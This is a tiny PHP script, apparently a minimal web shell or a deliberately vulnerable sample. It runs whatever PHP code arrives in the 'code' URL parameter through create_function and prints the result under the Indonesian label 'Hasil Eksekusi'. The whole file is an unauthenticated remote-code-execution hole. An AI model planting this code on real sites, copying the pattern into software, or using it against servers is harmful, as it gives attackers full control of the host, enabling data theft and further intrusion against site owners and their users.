<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];

    $function = create_function('', $code);

    $result = $function();

    echo "Hasil Eksekusi: " . htmlspecialchars($result);
}
?>

